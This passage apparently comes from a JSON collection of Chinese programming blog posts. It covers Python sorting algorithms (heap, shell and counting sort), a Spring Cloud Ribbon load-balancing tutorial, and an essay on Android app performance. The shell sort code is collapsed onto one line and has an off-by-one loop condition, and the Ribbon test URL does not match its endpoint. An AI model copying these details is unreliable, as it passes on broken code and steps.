此时的列表，应该排除最后一个已经排好序的，放置最大值的位置，所以i-1\n\n时间复杂度也是O(nlogn)\n来扩展一下，如果要取一个列表的top10，就是取列表的前十大的数，怎么做？\n可以用堆来实现，取堆的前十个数，构造成一个小根堆，然后依次遍历列表后面的数，如果比堆顶小，则忽略，如果比堆顶大，则将堆顶替换成改元素，然后进行一次向下调整，最终这个小根堆就是top10\n其实Python自带一个heapq模块，就是帮我们对堆进行操作的\nheapq模块\n队列中的每个元素都有优先级，优先级最高的元素优先得到服务（操作），这就是优先队列，而优先队列通常用堆来实现\n如果用heapq模块来实现堆排序，就简单多了：\n\nimport heapq\ndef heapq_sort(li):\n    h = []\n    for value in li:\n        heapq.heappush(h,value)\n    return [heapq.heappop(h) for i in range(len(h))]\n\n而想取top10 ，直接一个方法就行了\n\nheapq.nlargest(10,li)\n\n \n这三种速度快的排序方式就说完了，其中，快排是速度最快的，即使这样，也不如Python自带的sort快\n再来介绍两种排序，希尔排序和计数排序\n7.希尔排序\n希尔排序是一种分组插入排序的算法　　\n思路：\n　　首先取一个整数d1=n/2，将元素分为d1个组，每组相邻量元素之间距离为d1，在各组内进行直接插入排序；\n　　取第二个整数d2=d1/2，重复上述分组排序过程，直到di=1，即所有元素在同一组内进行直接插入排序。\n希尔排序每趟并不使某些元素有序，而是使整体数据越来越接近有序；最后一趟排序使得所有数据有序。\n \n图示：\n　 \n代码：\n\ndef shell_sort(li):    gap = int(len(li)//2)   # 初始把列表分成 gap个组，但是每组最多就两个元素，第一组可能有三个元素    while gap >0:        for i in range(gap,len(li)):            tmp = li[i]            j = i - gap            while j>0 and tmp<li[j]:    # 对每一组的每一个数，都和他前面的那个数比较，小的在前面                li[j+gap] = li[j]                j -= gap            li[j+gap] = tmp        gap = int(gap//2)　　　　# Python3中地板除也是float类型    return li\n\n通过diamante也能看出来，其实希尔排序和插入排序是非常相像的，插入排序就可以看做是固定间隔为1的希尔排序，希尔排序就是把插入排序分了个组，同一个组内，相邻两个数之间不是相差1，而是相差gap\n时间复杂度：O((1+t)n)，其中t是个大于0小于1的数，取决于gap的取法，当gap=len(li)//2的时候，t大约等于0.3\n \n8.计数排序\n需求：有一个列表，列表中的数都在0到100之间（整数），列表长度大约是100万，设计算法在O(n)时间复杂度内将列表进行排序\n分析：列表长度很大，但是数据量很少，会有大量的重复数据。可以考虑对这100个数进行排序\n代码：\n\ndef count_sort(li):\n    count = [0 for i in range(101)]  # 根据原题，0-100的整数\n    for i in li:\n        count[i] += 1\n\n    i = 0\n    for num,m in enumerate(count):  # enumerate函数将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。\n        for j in range(m):\n            li[i] = num\n            i += 1\n\n "},{"title":"【微服务】之四：轻松搞定SpringCloud微服务-负载均衡Ribbon","body":"\n对于任何一个高可用高负载的系统来说，负载均衡是一个必不可少的名称。在大型分布式计算体系中，某个服务在单例的情况下，很难应对各种突发情况。因此，负载均衡是为了让系统在性能出现瓶颈或者其中一些出现状态下可以进行分发业务量的解决方案。在SpringCloud 体系当中，加入了Netflix公司的很多优秀产品，其中一个就是针对于服务端进行负载均衡的Ribbon。\n\n本系列博文目录\n【微服务】之三：轻松搞定SpringCloud微服务目录\n本系列为连载文章，阅读本文之前强烈建议您先阅读前面几篇。\n相关简介\n负载均衡简介\n负载均衡：英文名称为Load Balance， 建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。其意思就是分摊到多个操作单元上进行执行，例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。\n负载均衡带来的好处很明显：\nRibbon简介\nRibbon是Netflix开源的一款用于客户端软负载均衡的工具软件。Spring Cloud对Ribbon进行了一些封装以更好的使用Spring Boot的自动化配置理念。\nSpring Cloud Ribbon 简介\nSpring Cloud Ribbon是基于Netflix Ribbon实现的一套客户端负载均衡的工具。它是一个基于HTTP和TCP的客户端负载均衡器。它可以通过在客户端中配置ribbonServerList来设置服务端列表去轮询访问以达到均衡负载的作用。\n开始起飞\n起飞之前，先说明一下，本项目前几篇文章中已经构建了相关子项目包括：注册中心、配置中心。本文中继续可以使用。\n创建两个服务器\n需要创建两个一模一样的服务器，让客户端按照不同的机制进行分发，达到负载均衡的效果。我们约定两个子项目名称：\ncloud-hyh-service-1 端口号：8071\ncloud-hyh-service-2 端口号：8072\n对于服务名称设置一样：cloud-service ，其他业务都一样，可以复制。【端口号不一样】\npom.xml文件配置\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-eureka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n服务器一参数配置\n#服务注册中心配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: cloud-service\n    lease-renewal-interval-in-seconds: 1\n\nserver:\n  port: 8071\n\nspring:\n  application:\n    name: cloud-service\n\n服务器二参数配置\n#服务注册中心配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: cloud-service\n\nserver:\n  port: 8072\n\nspring:\n  application:\n    name: cloud-service\n说明：与配置一其实基本一样，只不过将端口号配置成 8072\n服务器入口配置Application.yml\n/**\n * @Description : \n * @Author hanyahong\n * @Date 2017/12/7- 17:35\n */\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class ServiceTwoApplication {\n    public static void main(String[] args) {\n        SpringApplication.run(ServiceTwoApplication.class, args);\n    }\n}\n新建测试API类\n/**\n * @Description :测试RibbonTest API\n * @Author hanyahong\n * @Date 2017/12/7- 17:40\n */\n@RestController\n@RequestMapping(value = \"/ribbon\")\npublic class RibbonTestApi {\n\n    /**\n     * 获取博客名称API\n     *\n     * @return 相关信息\n     */\n    @RequestMapping(value = \"name\", method = RequestMethod.GET)\n    public String getMyBlogNameApi() {\n        return \"千万之路刚开始-www.hanyahong.com-beijing\"+\"该服务器端口号：8071\";\n    }\n}\n\n\n备注：两台服务器，除了返回的服务器端口号 8071 8072不同之外，其他都相同，就是为了看到效果。\n创建测试客户端\n创建一个子项目，cloud-hyh-ribbon-client ,主要用来测试ribbon客户端负载。\npom文件配置\n在pom文件中加入以下依赖：\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.cloud</groupId>\n        <artifactId>spring-cloud-starter-eureka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-test</artifactId>\n        <scope>test</scope>\n    </dependency>\n</dependencies>\n<build>\n     <plugins>\n         <plugin>\n             <groupId>org.springframework.boot</groupId>\n             <artifactId>spring-boot-maven-plugin</artifactId>\n         </plugin>\n     </plugins>\n </build>\n配置文件application配置\neureka:\n  client:\n    service-url:\n      defaultZone: http://localhost:8081/eureka/\n  instance:\n    appname: ribbon-client\n\nserver:\n  port: 8092\n\nspring:\n  application:\n    name: ribbon-client\n配置子项目启动类\n/**\n * @Description :启动类，示范负载均衡服务器\n * @Author hanyahong\n * @Date 2017/12/7- 17:00\n */\n@SpringBootApplication\n@EnableDiscoveryClient\npublic class RibbonServiceApplication {\n\n    public static void main(String[] args) {\n\n        SpringApplication.run(RibbonServiceApplication.class, args);\n    }\n\n    /**\n     * Spring提供的用于访问Rest服务的客户端\n     * @return\n     */\n    @Bean\n    @LoadBalanced\n    RestTemplate restTemplate() {\n        return new RestTemplate();\n    }\n}\n说明：\n\nRestTemplate是Spring提供的用于访问Rest服务的客户端。RestTemplate提供了多种便捷访问远程Http服务的方法，能够大大提高客户端的编写效率。调用RestTemplate的默认构造函数，RestTemplate对象在底层通过使用java.net包下的实现创建HTTP 请求，可以通过使用ClientHttpRequestFactory指定不同的HTTP请求方式。\nClientHttpRequestFactory接口主要提供了两种实现方式，一种是SimpleClientHttpRequestFactory，使用J2SE提供的方式（既java.net包提供的方式）创建底层的Http请求连接，还有一种方式是使用HttpComponentsClientHttpRequestFactory方式，底层使用HttpClient访问远程的Http服务，使用HttpClient可以配置连接池和证书等信息。\n\n**@LoadBalanced** 注解加在RestTemplate上面，这个注解会自动构造LoadBalancerClient接口的实现类并注册到Spring容器中。\n创建接口API\n/**\n * @Description : 测试客户端负载均衡的接口API\n * @Author hanyahong\n * @Date 2017/12/7- 18:01\n */\n@RestController\n@RequestMapping(value = \"/test\")\npublic class TestRibbonApi {\n    /**\n     * 注入RestTemplate\n     */\n    @Autowired\n    RestTemplate restTemplate;\n\n\n    @RequestMapping(value = \"/blog/name\" ,method = RequestMethod.GET)\n    public String testGetNameOfBlog(){\n        String url=\"http://CLOUD-SERVICE/ribbon/name\";\n        return restTemplate.getForObject(url,String.class);\n    }\n}\n注意：这个代码中 url 设置的是 上面提到的服务器的服务名。\n启动项目群进行测试\n经过全面的配置，服务器全面配置完毕，包括一个注册中心、一个配置中心、两个相同配置的服务器、一台测试客户端负载均衡的测试服务器。\n启动成功以后会在注册中心看到。\n\n通过访问客户端地址：http://localhost:8092/test/name 就可以访问。效果如下：\n\n刷新一次：\n\n至此所有配置成功。测试结果也成功。\n本文源码\nGithub源码：https://github.com/hanyahong/spring-cloud-microservice\n"},{"title":"Android APP 性能优化的一些思考","body":"说到 Android 系统手机，大部分人的印象是用了一段时间就变得有点卡顿，有些程序在运行期间莫名其妙的出现崩溃，打开系统文件夹一看，发现多了很多文件，然后用手机管家 APP 不断地进行清理优化 ，才感觉运行速度稍微提高了点，就算手机在各种性能跑分软件面前分数遥遥领先，还是感觉无论有多大的内存空间都远远不够用。相信每个使用 Android 系统的用户都有过以上类似经历，确实，Android 系统在流畅性方面不如 IOS 系统，为何呢，明明在看手机硬件配置上时，Android 设备都不会输于 IOS 设备，甚至都强于它，关键是在于软件上。造成这种现象的原因是多方面的，简单罗列几点如下：\n\n其实近年来，随着 Android 版本不断迭代，Google 提供的Android 系统已经越来越流畅，目前最新发布的版本是 Android 8.0 Oreo 。但是在国内大部分用户用的 Android 手机系是各大厂商定制过的版本，往往不是最新的原生系统内核，可能绝大多数还停留在 Android 5.0 系统上，甚至 Android 6.0 以上所占比例还偏小，更新存在延迟性。\n由于 Android 系统源码是开放的，每个人只要遵从相应的协议，就可以对源码进行修改，那么国内各个厂商就把基于 Android 源码改造成自己对外发布的系统，比如我们熟悉的小米手机 Miui 系统、华为手机 EMUI 系统、Oppo 手机 ColorOS 系统等。由于每个厂商都修改过 Android 原生系统源码，这里面就会引发一个问题，那就是著名的Android 碎片化问题，本质就是不同 Android 系统的应用兼容性不同，达不到一致性。\n由于存在着各种 Android 碎片化和兼容性问题，导致 Android 开发者在开发应用时需要对不同系统进行适配，同时每个 Android 开发者的开发水平参差不齐，写出来的应用性能也都存在不同类型的问题，导致用户在使用过程中用户体验感受不同，那么有些问题用户就会转化为 Android 系统问题，进而影响对Android 手机的评价。\n\n性能优化\n今天想说的重点是Android APP  性能优化，也就是在开发应用程序时应该注意的点有哪些，如何更好地提高用户体验。一个好的应用，除了要有吸引人的功能和交互之外，在性能上也应该有高的要求，即时应用非常具有特色，在产品前期可能吸引了部分用户，但是用户体验不好的话，也会给产品带来不好的口碑。那么一个好的应用应该如何定义呢？主要有以下三方面：\n\n业务/功能\n符合逻辑的交互\n优秀的性能\n\n众所周知，Android 系统作为以移动设备为主的操作系统，硬件配置是有一定的限制的，虽然配置现在越来越高级，但仍然无法与 PC 相比，在 CPU 和内存上使用不合理或者耗费资源多时，就会碰到内存不足导致的稳定性问题、CPU 消耗太多导致的卡顿问题等。\n面对问题时，大家想到的都是联系用户，然后查看日志，但殊不知有关性能类问题的反馈，原因也非常难找，日志大多用处不大，为何呢？因为性能问题大部分是非必现的问题，问题定位很难复现，而又没有关键的日志，当然就无法找到原因了。这些问题非常影响用户体验和功能使用，所以了解一些性能优化的一些解决方案就显得很重要了，并在实际的项目中优化我们的应用，进而提高用户体验。\n四个方面\n可以把用户体验的性能问题主要总结为4个类别：\n\n流畅\n稳定\n省电、省流量\n安装包小\n\n性能问题的主要原因是什么，原因有相同的，也有不同的，但归根到底，不外乎内存使用、代码效率、合适的策略逻辑、代码质量、安装包体积这一类问题，整理归类如下：\n\n从图中可以看到，打造一个高质量的应用应该以4个方向为目标：快、稳、省、小。\n快：使用时避免出现卡顿，响应速度快，减少用户等待的时间，满足用户期望。\n稳：减低 crash 率和 ANR 率，不要在用户使用过程中崩溃和无响应。\n省：节省流量和耗电，减少用户使用成本，避免使用时导致手机发烫。\n小：安装包小可以降低用户的安装成本。\n要想达到这4个目标，具体实现是在右边框里的问题：卡顿、内存使用不合理、代码质量差、代码逻辑乱、安装包过大，这些问题也是在开发过程中碰到最多的问题，在实现业务需求同时，也需要考虑到这点，多花时间去思考，如何避免功能完成后再来做优化，不然的话等功能实现后带来的维护成本会增加。\n卡顿优化\nAndroid 应用启动慢，使用时经常卡顿，是非常影响用户体验的，应该尽量避免出现。卡顿的场景有很多，按场景可以分为4类：UI 绘制、应用启动、页面跳转、事件响应，如图：\n\n这4种卡顿场景的根本原因可以分为两大类：\n\n界面绘制。主要原因是绘制的层级深、页面复杂、刷新不合理，由于这些原因导致卡顿的场景更多出现在 UI 和启动后的初始界面以及跳转到页面的绘制上。\n数据处理。导致这种卡顿场景的原因是数据处理量太大，一般分为三种情况，一是数据在处理 UI 线程，二是数据处理占用 CPU 高，导致主线程拿不到时间片，三是内存增加导致 GC 频繁，从而引起卡顿。\n\n引起卡顿的原因很多，但不管怎么样的原因和场景，最终都是通过设备屏幕上显示来达到用户，归根到底就是显示有问题，所以，要解决卡顿，就要先了解 Android 系统的显示原理。\nAndroid系统显示原理\nAndroid 显示过程可以简单概括为：Android 应用程序把经过测量、布局、绘制后的 surface 缓存数据，通过 SurfaceFlinger 把数据渲染到显示屏幕上， 通过 Android 的刷新机制来刷新数据。也就是说应用层负责绘制，系统层负责渲染，通过进程间通信把应用层需要绘制的数据传递到系统层服务，系统层服务通过刷新机制把数据更新到屏幕上。\n我们都知道在 Android 的每个 View 绘制中有三个核心步骤：Measure、Layout、Draw。具体实现是从 ViewRootImp 类的performTraversals() 方法开始执行，Measure 和 Layout都是通过递归来获取 View 的大小和位置，并且以深度作为优先级，可以看出层级越深、元素越多、耗时也就越长。\n真正把需要显示的数据渲染到屏幕上，是通过系统级进程中的 SurfaceFlinger 服务来实现的，那么这个SurfaceFlinger 服务主要做了哪些工作呢？如下：\n\n响应客户端事件，创建 Layer 与客户端的 Surface 建立连接。\n接收客户端数据及属性，修改 Layer 属性，如尺寸、颜色、透明度等。\n将创建的 Layer 内容刷新到屏幕上。\n维持 Layer 的序列，并对 Layer 最终输出做出裁剪计算。\n\n既然是两个不同的进程，那么肯定是需要一个跨进程的通信机制来实现数据传递，在 Android 显示系统中，使用了 Android 的匿名共享内存：SharedClient，每一个应用和 SurfaceFlinger 之间都会创建一个SharedClient ，然后在每个 SharedClient 中，最多可以创建 31 个 SharedBufferStack，每个 Surface 都对应一个 SharedBufferStack，也就是一个 Window。\n一个 SharedClient 对应一个Android 应用程序，而一个 Android 应用程序可能包含多个窗口，即 Surface 。也就是说 SharedClient 包含的是 SharedBufferStack的集合，其中在显示刷新机制中用到了双缓冲和三重缓冲技术。最后总结起来显示整体流程分为三个模块：应用层绘制到缓存区，SurfaceFlinger 把缓存区数据渲染到屏幕，由于是不同的进程，所以使用 Android 的匿名共享内存 SharedClient 缓存需要显示的数据来达到目的。\n除此之外，我们还需要一个名词：FPS。FPS 表示每秒传递的帧数。在理想情况下，60 FPS 就感觉不到卡，这意味着每个绘制时长应该在16 ms 以内。但是 Android 系统很有可能无法及时完成那些复杂的页面渲染操作。Android 系统每隔 16ms 发出 VSYNC 信号，触发对 UI 进行渲染，如果每次渲染都成功，这样就能够达到流畅的画面所需的 60FPS。如果某个操作花费的时间是 24ms ，系统在得到 VSYNC 信号时就无法正常进行正常渲染，这样就发生了丢帧现象。那么用户在 32ms 内看到的会是同一帧画面，这种现象在执行动画或滑动列表比较常见，还有可能是你的 Layout 太过复杂，层叠太多的绘制单元，无法在 16ms 完成渲染，最终引起刷新不及时。\n卡顿根本原因\n根据Android 系统显示原理可以看到，影响绘制的根本原因有以下两个方面：\n\n绘制任务太重，绘制一帧内容耗时太长。\n主线程太忙，根据系统传递过来的 VSYNC 信号来时还没准备好数据导致丢帧。\n\n绘制耗时太长，有一些工具可以帮助我们定位问题。主线程太忙则需要注意了，主线程关键职责是处理用户交互，在屏幕上绘制像素，并进行加载显示相关的数据，所以特别需要避免任何主线程的事情，这样应用程序才能保持对用户操作的即时响应。总结起来，主线程主要做以下几个方面工作：\n\nUI 生命周期控制\n系统事件处理\n消息处理\n界面布局\n界面绘制\n界面刷新\n\n除此之外，应该尽量避免将其他处理放在主线程中，特别复杂的数据计算和网络请求等。\n性能分析工具\n性能问题并不容易复现，也不好定位，但是真的碰到问题还是需要去解决的，那么分析问题和确认问题是否解决，就需要借助相应的的调试工具，比如查看 Layout 层次的 Hierarchy View、Android 系统上带的 GPU Profile 工具和静态代码检查工具 Lint 等，这些工具对性能优化起到非常重要的作用，所以要熟悉，知道在什么场景用什么工具来分析。\n1，Profile GPU Rendering\n在手机开发者模式下，有一个卡顿检测工具叫做：Profile GPU Rendering，如图：\n\n它的功能特点如下：\n\n一个图形监测工具，能实时反应当前绘制的耗时\n横轴表示时间，纵轴表示每一帧的耗时\n随着时间推移，从左到右的刷新呈现\n提供一个标准的耗时，如果高于标准耗时，就表示当前这一帧丢失\n\n2，TraceView\nTraceView 是 Android SDK 自带的工具，用来分析函数调用过程，可以对 Android 的应用程序以及 Framework 层的代码进行性能分析。它是一个图形化的工具，最终会产生一个图表，用于对性能分析进行说明，可以分析到每一个方法的执行时间，其中可以统计出该方法调用次数和递归次数，实际时长等参数维度，使用非常直观，分析性能非常方便。\n3，Systrace UI 性能分析\nSystrace 是 Android 4.1及以上版本提供的性能数据采样和分析工具，它是通过系统的角度来返回一些信息。它可以帮助开发者收集 Android 关键子系统，如 surfaceflinger、WindowManagerService 等 Framework 部分关键模块、服务、View系统等运行信息，从而帮助开发者更直观地分析系统瓶颈，改进性能。Systrace 的功能包括跟踪系统的 I/O 操作、内核工作队列、CPU 负载等，在 UI 显示性能分析上提供很好的数据，特别是在动画播放不流畅、渲染卡等问题上。\n优化建议\n1，布局优化\n布局是否合理主要影响的是页面测量时间的多少，我们知道一个页面的显示测量和绘制过程都是通过递归来完成的，多叉树遍历的时间与树的高度h有关，其时间复杂度 O(h)，如果层级太深，每增加一层则会增加更多的页面显示时间，所以布局的合理性就显得很重要。\n那布局优化有哪些方法呢，主要通过减少层级、减少测量和绘制时间、提高复用性三个方面入手。总结如下：\n\n减少层级。合理使用 RelativeLayout 和 LinerLayout，合理使用Merge。\n提高显示速度。使用 ViewStub，它是一个看不见的、不占布局位置、占用资源非常小的视图对象。\n布局复用。可以通过 标签来提高复用。\n尽可能少用wrap_content。wrap_content 会增加布局 measure 时计算成本，在已知宽高为固定值时，不用wrap_content 。\n删除控件中无用的属性。\n\n2，避免过度绘制\n过度绘制是指在屏幕上的某个像素在同一帧的时间内被绘制了多次。在多层次重叠的 UI 结构中，如果不可见的 UI 也在做绘制的操作，就会导致某些像素区域被绘制了多次，从而浪费了多余的 CPU 以及 GPU 资源。\n如何避免过度绘制呢，如下：\n\n布局上的优化。移除 XML 中非必须的背景，移除 Window 默认的背景、按需显示占位背景图片\n自定义View优化。使用 canvas.clipRect()来帮助系统识别那些可见的区域，只有在这个区域内才会被绘制。\n\n3，启动优化\n通过对启动速度的监控，发现影响启动速度的问题所在，优化启动逻辑，提高应用的启动速度。启动主要完成三件事：UI 布局、绘制和数据准备。因此启动速度优化就是需要优化这三个过程：\n\nUI 布局。应用一般都有闪屏页，优化闪屏页的 UI 布局，可以通过 Profile GPU Rendering 检测丢帧情况。\n启动加载逻辑优化。可以采用分布加载、异步加载、延期加载策略来提高应用启动速度。\n数据准备。数据初始化分析，加载数据可以考虑用线程初始化等策略。\n\n4，合理的刷新机制\n在应用开发过程中，因为数据的变化，需要刷新页面来展示新的数据，但频繁刷新会增加资源开销，并且可能导致卡顿发生，因此，需要一个合理的刷新机制来提高整体的 UI 流畅度。合理的刷新需要注意以下几点：\n\n尽量减少刷新次数。\n尽量避免后台有高的 CPU 线程运行。\n缩小刷新区域。\n\n5，其他\n在实现动画效果时，需要根据不同场景选择合适的动画框架来实现。有些情况下，可以用硬件加速方式来提供流畅度。\n内存优化\n在 Android 系统中有个垃圾内存回收机制，在虚拟机层自动分配和释放内存，因此不需要在代码中分配和释放某一块内存，从应用层面上不容易出现内存泄漏和内存溢出等问题，但是需要内存管理。Android 系统在内存管理上有一个 Generational Heap Memory 模型，内存回收的大部分压力不需要应用层关心， Generational Heap Memory 有自己一套管理机制，当内存达到一个阈值时，系统会根据不同的规则自动释放系统认为可以释放的内存，也正是因为 Android 程序把内存控制的权力交给了 Generational Heap Memory，一旦出现内存泄漏和溢出方面的问题，排查错误将会成为一项异常艰难的工作。除此之外，部分 Android 应用开发人员在开发过程中并没有特别关注内存的合理使用，也没有在内存方面做太多的优化，当应用程序同时运行越来越多的任务，加上越来越复杂的业务需求时，完全依赖 Android 的内存管理机制就会导致一系列性能问题逐渐呈现，对应用的稳定性和性能带来不可忽视的影响，因此，解决内存问题和合理优化内存是非常有必要的。\nAndroid内存管理机制\nAndroid 应用都是在 Android 的虚拟机上运行，应用 程序的内存分配与垃圾回收都是由虚拟机完成的。在 Android 系统，虚拟机有两种运行模式：Dalvik 和 ART。\n1，Java对象生命周期\n\n一般Java对象在虚拟机上有7个运行阶段：\n创建阶段->应用阶段->不可见阶段->不可达阶段->收集阶段->终结阶段->对象空间重新分配阶段\n2，内存分配\n在 Android 系统中，内存分配实际上是对堆的分配和释放。当一个 Android 程序启动，应用进程都是从一个叫做 Zygote 的进程衍生出来，系统启动 Zygote 进程后，为了启动一个新的应用程序进程，系统会衍生 Zygote 进程生成一个新的进程，然后在新的进程中加载并运行应用程序的代码。其中，大多数的 RAM pages 被用来分配给Framework 代码，同时促使 RAM 资源能够在应用所有进程之间共享。\n但是为了整个系统的内存控制需要，Android 系统会为每一个应用程序都设置一个硬性的 Dalvik Heap Size 最大限制阈值，整个阈值在不同设备上会因为 RAM 大小不同而有所差异。如果应用占用内存空间已经接近整个阈值时，再尝试分配内存的话，就很容易引起内存溢出的错误。\n3，内存回收机制\n我们需要知道的是，在 Java 中内存被分为三个区域：Young Generation(年轻代)、Old Generation(年老代)、Permanent Generation(持久代)。最近分配的对象会存放在 Young Generation 区域。对象在某个时机触发 GC 回收垃圾，而没有回收的就根据不同规则，有可能被移动到 Old Generation，最后累积一定时间在移动到 Permanent Generation 区域。系统会根据内存中不同的内存数据类型分别执行不同的 GC 操作。GC 通过确定对象是否被活动对象引用来确定是否收集对象，进而动态回收无任何引用的对象占据的内存空间。但需要注意的是频繁的 GC 会增加应用的卡顿情况，影响应用的流畅性，因此需要尽量减少系统 GC 行为，以便提高应用的流畅度，减小卡顿发生的概率。\n内存分析工具\n做内存优化前，需要了解当前应用的内存使用现状，通过现状去分析哪些数据类型有问题，各种类型的分布情况如何，以及在发现问题后如何发现是哪些具体对象导致的，这就需要相关工具来帮助我们。\n1，Memory Monitor\nMemory Monitor 是一款使用非常简单的图形化工具，可以很好地监控系统或应用的内存使用情况，主要有以下功能：\n\n显示可用和已用内存，并且以时间为维度实时反应内存分配和回收情况。\n快速判断应用程序的运行缓慢是否由于过度的内存回收导致。\n快速判断应用是否由于内存不足导致程序崩溃。\n\n2，Heap Viewer\nHeap Viewer 的主要功能是查看不同数据类型在内存中的使用情况，可以看到当前进程中的 Heap Size 的情况，分别有哪些类型的数据，以及各种类型数据占比情况。通过分析这些数据来找到大的内存对象，再进一步分析这些大对象，进而通过优化减少内存开销，也可以通过数据的变化发现内存泄漏。\n3，Allocation Tracker\nMemory Monitor 和 Heap Viewer 都可以很直观且实时地监控内存使用情况，还能发现内存问题，但发现内存问题后不能再进一步找到原因，或者发现一块异常内存，但不能区别是否正常，同时在发现问题后，也不能定位到具体的类和方法。这时就需要使用另一个内存分析工具 Allocation Tracker，进行更详细的分析， Allocation Tracker 可以分配跟踪记录应用程序的内存分配，并列出了它们的调用堆栈，可以查看所有对象内存分配的周期。\n4，Memory Analyzer Tool(MAT)\nMAT 是一个快速，功能丰富的 Java Heap 分析工具，通过分析 Java 进程的内存快照 HPROF 分析，从众多的对象中分析，快速计算出在内存中对象占用的大小，查看哪些对象不能被垃圾收集器回收，并可以通过视图直观地查看可能造成这种结果的对象。\n常见内存泄漏场景\n如果在内存泄漏发生后再去找原因并修复会增加开发的成本，最好在编写代码时就能够很好地考虑内存问题，写出更高质量的代码，这里列出一些常见的内存泄漏场景，在以后的开发过程中需要避免这类问题。\n\n资源性对象未关闭。比如Cursor、File文件等，往往都用了一些缓冲，在不使用时，应该及时关闭它们。\n注册对象未注销。比如事件注册后未注销，会导致观察者列表中维持着对象的引用。\n类的静态变量持有大数据对象。\n非静态内部类的静态实例。\nHandler临时性内存泄漏。如果Handler是非静态的，容易导致 Activity 或 Service 不会被回收。\n容器中的对象没清理造成的内存泄漏。\nWebView。WebView 存在着内存泄漏的问题，在应用中只要使用一次 WebView，内存就不会被释放掉。\n\n除此之外，内存泄漏可监控，常见的就是用LeakCanary 第三方库，这是一个检测内存泄漏的开源库，使用非常简单，可以在发生内存泄漏时告警，并且生成 leak tarce 分析泄漏位置，同时可以提供 Dump 文件进行分析。\n优化内存空间\n没有内存泄漏，并不意味着内存就不需要优化，在移动设备上，由于物理设备的存储空间有限，Android 系统对每个应用进程也都分配了有限的堆内存，因此使用最小内存对象或者资源可以减小内存开销，同时让GC 能更高效地回收不再需要使用的对象，让应用堆内存保持充足的可用内存，使应用更稳定高效地运行。常见做法如下：\n\n对象引用。强引用、软引用、弱引用、虚引用四种引用类型，根据业务需求合理使用不同，选择不同的引用类型。\n减少不必要的内存开销。注意自动装箱，增加内存复用，比如有效利用系统自带的资源、视图复用、对象池、Bitmap对象的复用。\n使用最优的数据类型。比如针对数据类容器结构，可以使用ArrayMap数据结构，避免使用枚举类型，使用缓存Lrucache等等。\n图片内存优化。可以设置位图规格，根据采样因子做压缩，用一些图片缓存方式对图片进行管理等等。\n\n稳定性优化\nAndroid 应用的稳定性定义很宽泛，影响稳定性的原因很多，比如内存使用不合理、代码异常场景考虑不周全、代码逻辑不合理等，都会对应用的稳定性造成影响。其中最常见的两个场景是：Crash 和 ANR，这两个错误将会使得程序无法使用，比较常用的解决方式如下：\n\n提高代码质量。比如开发期间的代码审核，看些代码设计逻辑，业务合理性等。\n代码静态扫描工具。常见工具有Android Lint、Findbugs、Checkstyle、PMD等等。\nCrash监控。把一些崩溃的信息，异常信息及时地记录下来，以便后续分析解决。\nCrash上传机制。在Crash后，尽量先保存日志到本地，然后等下一次网络正常时再上传日志信息。\n\n耗电优化\n在移动设备中，电池的重要性不言而喻，没有电什么都干不成。对于操作系统和设备开发商来说，耗电优化一致没有停止，去追求更长的待机时间，而对于一款应用来说，并不是可以忽略电量使用问题，特别是那些被归为“电池杀手”的应用，最终的结果是被卸载。因此，应用开发者在实现需求的同时，需要尽量减少电量的消耗。\n在 Android5.0 以前，在应用中测试电量消耗比较麻烦，也不准确，5.0 之后专门引入了一个获取设备上电量消耗信息的 API:Battery Historian。Battery Historian 是一款由 Google 提供的 Android 系统电量分析工具，和Systrace 一样，是一款图形化数据分析工具，直观地展示出手机的电量消耗过程，通过输入电量分析文件，显示消耗情况，最后提供一些可供参考电量优化的方法。\n除此之外，还有一些常用方案可提供：\n\n计算优化，避开浮点运算等。\n避免 WaleLock 使用不当。\n使用 Job Scheduler。\n\n安装包大小优化\n应用安装包大小对应用使用没有影响，但应用的安装包越大，用户下载的门槛越高，特别是在移动网络情况下，用户在下载应用时，对安装包大小的要求更高，因此，减小安装包大小可以让更多用户愿意下载和体验产品。\n常用应用安装包的构成，如图所示：\n\n从图中我们可以看到：\n\nassets文件夹。存放一些配置文件、资源文件，assets不会自动生成对应的 ID，而是通过 AssetManager 类的接口获取。\nres。res 是 resource 的缩写，这个目录存放资源文件，会自动生成对应的 ID 并映射到 .R 文件中，访问直接使用资源 ID。\nMETA-INF。保存应用的签名信息，签名信息可以验证 APK 文件的完整性。\nAndroidManifest.xml。这个文件用来描述 Android 应用的配置信息，一些组件的注册信息、可使用权限等。\nclasses.dex。Dalvik 字节码程序，让 Dalvik 虚拟机可执行，一般情况下，Android 应用在打包时通过 Android SDK 中的 dx 工具将 Java 字节码转换为 Dalvik 字节码。\nresources.arsc。记录着资源文件和资源 ID 之间的映射关系，用来根据资源 ID 寻找资源。\n\n减少安装包大小的常用方案\n\n代码混淆。使用proGuard 代码混淆器工具，它包括压缩、优化、混淆等功能。\n资源优化。比如使用 Android Lint 删除冗余资源，资源文件最少化等。\n图片优化。比如利用 AAPT 工具对 PNG 格式的图片做压缩处理，降低图片色彩位数等。\n避免重复功能的库，使用 